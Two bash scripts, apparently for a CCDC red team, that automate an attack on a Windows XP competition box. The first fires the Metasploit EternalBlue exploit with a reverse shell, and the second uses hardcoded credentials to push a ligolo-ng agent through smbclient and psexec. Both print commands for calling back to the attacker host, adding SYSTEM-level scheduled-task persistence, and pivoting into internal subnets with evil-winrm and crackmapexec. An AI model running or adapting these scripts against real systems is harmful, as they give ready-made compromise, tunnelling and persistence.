#!/bin/bash
# ================================================
# CCDC EternalBlue + ligolo-ng Auto-Deploy (XP Adventure Box)
# Usage: ./eternalblue_ligolo.sh <team_number> [attacker_ip]
# Completely credential-less — survives full cred rotation
# ================================================

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <team> [attacker_ip]"
  exit 1
fi

TEAM="$1"
ATTACKER_IP="${2:-$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)}"
TARGET="192.168.20${TEAM}.72"
LPORT=4444
DOMAIN="aperturesciencelabs.org"

echo "[+] ================================================"
echo "[+] EternalBlue + ligolo-ng on Adventure XP (team ${TEAM})"
echo "[+] Target: ${TARGET} | Attacker: ${ATTACKER_IP}"
echo "[+] ================================================"

# 1. Start ligolo proxy (background)
echo "[+] Starting ligolo-ng proxy on 443..."
nohup ./ligolo-ng proxy -selfcert -laddr 0.0.0.0:443 > ligolo_proxy.log 2>&1 &
sleep 2

# 2. Start SMB share with the agent (impacket)
echo "[+] Starting SMB share 'SHARE' with agent.exe..."
impacket-smbserver SHARE . -smb2support -port 445 > smbserver.log 2>&1 &
sleep 2

# 3. Launch EternalBlue with reverse shell (Metasploit — most reliable for XP)
echo "[+] Launching EternalBlue exploit (reverse shell to ${ATTACKER_IP}:${LPORT})..."
cat > eternalblue.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS ${TARGET}
set PAYLOAD windows/x86/shell_reverse_tcp
set LHOST ${ATTACKER_IP}
set LPORT ${LPORT}
set TARGET 0
exploit -j
EOF

msfconsole -q -r eternalblue.rc > msf.log 2>&1 &

# Start listener in background
echo "[+] Starting netcat listener on ${LPORT}..."
nc -lvnp ${LPORT} > reverse_shell.log 2>&1 &

echo ""
echo "[+] ================================================"
echo "[+] WAIT FOR THE REVERSE SHELL (check nc window)"
echo "[+] When you get the shell (cmd.exe), PASTE THESE COMMANDS:"
echo "[+] ================================================"
echo ""
echo "net use Z: \\\\${ATTACKER_IP}\\SHARE"
echo "copy Z:\\agent.exe C:\\Windows\\Temp\\agent.exe"
echo "C:\\Windows\\Temp\\agent.exe -connect ${ATTACKER_IP}:443 -ignore-cert"
echo ""
echo "After the agent connects, in a NEW terminal run:"
echo "   ./ligolo-ng proxy -selfcert -laddr 0.0.0.0:443"
echo "Then in ligolo console:"
echo "   list"
echo "   session 1"
echo "   tunnel_start"
echo "   addroute 172.16.0.0/16"
echo ""
echo "[+] The agent will survive reboots if you later add:"
echo "   schtasks /create /tn Ligolo /tr \"C:\\Windows\\Temp\\agent.exe -connect ${ATTACKER_IP}:443 -ignore-cert\" /sc onstart /ru SYSTEM /f"
echo ""
echo "The cake is a lie… but EternalBlue + ligolo is forever."

#!/bin/bash
# ================================================
# CCDC ligolo-ng Auto-Deploy on Adventure (XP box)
# Usage: ./deploy_ligolo.sh <team_number> [attacker_ip]
#   - Deploys to 192.168.20<TEAM>.72 (Adventure)
#   - Starts ligolo proxy on port 443 (background)
#   - Uploads + executes agent via SMB + psexec (works on XP)
#   - Uses chell:Th3cake1salie! by default (or PortalGod with -k later)
# ================================================

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <team> [attacker_ip]"
  echo "   e.g. $0 5"
  echo "   e.g. $0 5 10.10.13.37"
  exit 1
fi

TEAM="$1"
ATTACKER_IP="${2:-$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1)}"
DOMAIN="aperturesciencelabs.org"
USER="chell"
PASS="Th3cake1salie!"
TARGET_IP="192.168.20${TEAM}.72"
AGENT="./agent.exe"          # ← Put your Windows agent here (rename ligolo-ng_agent_*_windows_amd64.exe → agent.exe)
PROXY_CMD="./ligolo-ng proxy" # or full path to ligolo-ng_proxy_linux_amd64

echo "[+] ================================================"
echo "[+] Deploying ligolo-ng on Adventure (team ${TEAM})"
echo "[+] Target: ${TARGET_IP} | Attacker: ${ATTACKER_IP}:443"
echo "[+] ================================================"

# 1. Start ligolo proxy in background (if not already running)
if ! ss -tlnp | grep -q ":443"; then
  echo "[+] Starting ligolo-ng proxy (port 443) in background..."
  nohup ${PROXY_CMD} -selfcert -laddr 0.0.0.0:443 > ligolo_proxy.log 2>&1 &
  sleep 3
  echo "[+] Proxy PID: $!"
else
  echo "[+] ligolo proxy already listening on 443"
fi

# 2. Upload agent via SMB (C$ share — works perfectly on XP)
echo "[+] Uploading agent.exe to C:\\Windows\\Temp\\..."
smbclient //${TARGET_IP}/C\$ -U "${DOMAIN}/${USER}%${PASS}" -c "put ${AGENT} Windows\\Temp\\agent.exe" || {
  echo "[-] SMB upload failed — check creds/connectivity"
  exit 1
}

# 3. Execute agent via psexec (reverse connect)
echo "[+] Launching ligolo-ng agent (reverse tunnel)..."
impacket-psexec "${DOMAIN}/${USER}:${PASS}@${TARGET_IP}" \
  "C:\\Windows\\Temp\\agent.exe -connect ${ATTACKER_IP}:443 -ignore-cert" \
  2>&1 | tail -n 20

echo ""
echo "[+] ================================================"
echo "[+] DEPLOYMENT COMPLETE — NOW CONFIGURE THE TUNNEL"
echo "[+] ================================================"
echo ""
echo "1. Open a NEW terminal and attach to the proxy console:"
echo "   ./ligolo-ng proxy -selfcert -laddr 0.0.0.0:443"
echo ""
echo "2. In the ligolo-ng console type these commands:"
echo "   > list                  # see the Adventure agent"
echo "   > session 1             # select the agent (or whatever ID it shows)"
echo "   > tunnel_start"
echo "   > addroute 172.16.0.0/16"
echo "   > ifconfig              # you should see ligolo0 interface with an IP"
echo ""
echo "3. You now have FULL internal access:"
echo "   ping 172.16.3.140       # curiosity DC"
echo "   ping 172.16.1.10        # morality"
echo "   evil-winrm -i 172.16.1.11 -u PortalGod -p ''"
echo "   proxychains4 crackmapexec smb 172.16.3.140 ..."
echo ""
echo "[+] Pro tip: Add more routes with 'addroute 172.16.1.0/24' etc."
echo "[+] The tunnel survives reboots if you add persistence (schtasks) later."
echo "[+] XP note: If agent.exe crashes (old OS), use rpivot.exe instead — same process."
echo ""
echo "The cake is a lie… but your internal TUN is forever."